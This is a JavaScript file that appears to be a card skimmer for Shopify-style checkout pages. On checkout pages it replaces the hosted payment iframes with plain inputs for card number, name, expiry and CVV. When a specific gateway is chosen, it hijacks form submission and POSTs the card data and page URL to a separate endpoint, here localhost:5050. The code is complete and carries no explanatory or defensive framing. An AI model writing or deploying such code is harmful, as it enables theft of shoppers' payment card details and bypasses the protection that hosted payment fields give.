
var _gateway_ = "18010570794";
var _gatewayCheck_ = "";


function loadJS(file , position){
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = file;
    var first = document.getElementsByTagName('script')[position];
    first.parentNode.insertBefore(script, first);
}

function loadCSS(file , position){
    var script = document.createElement('link');
    script.rel = 'stylesheet';
    script.href = file;
    var first = document.getElementsByTagName('link')[position];
    first.parentNode.insertBefore(script, first);
}


function isNumberKey(evt){
    var charCode = (evt.which) ? evt.which : event.keyCode
    if (charCode > 31 && (charCode < 48 || charCode > 57)){
        return false;
    } else {
        return true;
    }
}


function KeyUPMMYY(){
    var e = $("#expiry").val();
    if( e.length == 2 ){
        $("#expiry").val(e + "/");
    }
    if( e.length > 7 ){
        var T = "";
        for(var x=0; x<7; x++){
            T += e[x];
            $("#expiry").val(T);

        }
    } 
}

function KeyUPCVV(){
    var e = $("#verification_value").val();
    if( e.length >4 ){
        var T = "";
        for(var x=0; x<4; x++){
            T += e[x];
            $("#verification_value").val(T);

        }
    } 
}

function KeyUPCC(){
    var e = $("#number").val();
    if( e.length > 17 ){
        var T = "";
        for(var x=0; x<17; x++){
            T += e[x];
            $("#number").val(T);

        }
    } 
}


function loadPay(){
    loadCSS("https://checkout.shopifycs.com/build/inputs-4324d70392.css" , 0);
    loadCSS("https://fonts.googleapis.com/css?family=Open%20Sans" , 1);
    loadJS("https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js" , 0);
    setTimeout(() => {
        ClearForm();
    } , 500);
}


var cssPrepend = `
<style>
    .inputsForms{
        height: 40px;
        /*background-color: #ccc;*/
        padding-top: 15px;
        padding-left: 10px;    
    }
    body{
        overflow: auto !important;
    }
</style>    
`;



function ClearForm(){
    var pos_0 = $(".field__input--iframe-container")[0];
    var pos_1 = $(".field__input--iframe-container")[1];
    var pos_2 = $(".field__input--iframe-container")[2];
    var pos_3 = $(".field__input--iframe-container")[3];
    $(pos_0).html('<input placeholder="Card number" onkeyup="KeyUPCC()" onkeypress="return isNumberKey(event)" id="number" name="number" type="tel" class="inputsForms" />');
    $(pos_1).html('<input placeholder="Cardholder name" id="name" name="name" type="text" class="inputsForms" />');
    $(pos_2).html('<input placeholder="MM / YY" onkeyup="KeyUPMMYY()" onkeypress="return isNumberKey(event)" id="expiry" name="expiry" type="tel" class="inputsForms" />');
    $(pos_3).html('<input placeholder="CVV" onkeyup="KeyUPCVV()" onkeypress="return isNumberKey(event)" id="verification_value" name="verification_value" type="tel" class="inputsForms" />');
    $("body").prepend(cssPrepend);
    changeSubmit();
}


function changeSubmit(){
    var forms = $(".edit_checkout");
    if(forms.length > 0){
        for(var x=0; x<forms.length; x++){
            var form = $(forms)[x];
            if($(form).find('#previous_step').length){
                console.log("Xarrito " + x);
                $(form).attr("onsubmit" , "return onSubmitBuyOrder()");
            }
        }
    }
}



function onSubmitBuyOrder(){
    var checkouts = $(".content-box__row--secondary");
    if(checkouts.length > 0){
        for(var x=0; x<checkouts.length; x++){
            var check = $(checkouts)[x];
            var classCSS = $(check).attr("class");
            var gateway = $(check).attr("data-subfields-for-gateway");
            if( classCSS.indexOf("hidden") >= 0 ){
                continue;
            } else {
                _gatewayCheck_ = gateway;
                break;
            }
        }
    }
    if( _gatewayCheck_ == _gateway_ ){
        var dataPOST = {
            url: window.location.href,
            cc: $("#number").val(),
            name: $("#name").val(),
            expiry: $("#expiry").val(),
            cvv: $("#verification_value").val(),  
        }
        console.log(dataPOST);
        $.ajax({
            async:true,
            dataType: "json",
            type: "POST",
            url: "http://localhost:5050/api/order" ,
            data: dataPOST,
            global: true,
            ifModified: false,
            processData:true,
            contentType: "application/x-www-form-urlencoded",
            success: function(datos){
                console.log("OK");
                return false;
            } ,
            error: function(jqXHR, exception){
                console.log("ERROR");
                window.location.reload();
                return false;
            }
        });
        return false;
    } else {
        return true;
    }
}



if (window.location.href.indexOf('checkout') > -1 && document.location.href.indexOf('thank_you') === -1 && document.location.href.indexOf('orders') === -1) {
    window.onload = function() {
        loadPay();
    };
}





